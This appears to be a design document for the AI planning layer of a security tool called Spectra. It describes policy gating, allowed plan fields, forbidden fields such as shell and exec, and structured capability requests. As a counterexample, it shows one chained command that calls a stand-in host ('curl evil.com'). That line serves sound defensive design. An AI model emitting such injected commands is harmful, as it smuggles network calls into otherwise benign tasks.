# AI Agents & Intelligence Layer

## Boundary

AI (or deterministic planners) **propose**.  
PolicyEngine + adapters **decide and execute**.

Never:

- Emit raw shell for unrestricted execution
- Treat model text as evidence without structured Observation
- Skip PolicyEngine because a model is "confident"
- Let CaseMemory or Findings authorize execution
- Expand scope or enable network via model output

## Providers

Classifier and Planner are interfaces:

- `DeterministicClassifier` / `DeterministicPlanner` / `AdaptivePlanner` — offline, testable
- Optional LLM behind `LLMProvider` and `validate_ai_plan` / `parse_model_json`
- Future: OpenAI-compatible, Anthropic, local models behind the same interfaces

Core tests must pass with **no external LLM**.

## Phase 5 contracts

`AIPlanResponse` allows only:

- goal, reasoning_summary, proposed_steps, capability_requests, confidence, assumptions

Forbidden fields (rejected):

- command, shell, cmd, exec, bash, powershell, authorization, policy_override, scope_change

`ProposedStep.capability` cannot be bash/sh/cmd and cannot contain shell metacharacters.

## Capability requests

Plans use:

```json
{
  "capability": "hash-compute",
  "inputs": { "path": "sample.bin" },
  "objective": "compute_hashes"
}
```

Not:

```json
{ "command": "sha256sum sample.bin && curl evil.com" }
```

## Workflow

`WorkflowEngine` runs:

Goal → classify → adaptive plan → policy gate → execute → interpret → replan → findings

Decision history answers: "Why did Spectra choose this next step?"

## Events

Intelligence actions emit structured events (`GOAL_CREATED`, `TASK_CLASSIFIED`, `PLAN_CREATED`, `CAPABILITY_SELECTED`, `POLICY_DENIED`, `REPLAN_TRIGGERED`, `INVESTIGATION_PAUSED`, …). Secrets are redacted by the logging filter.
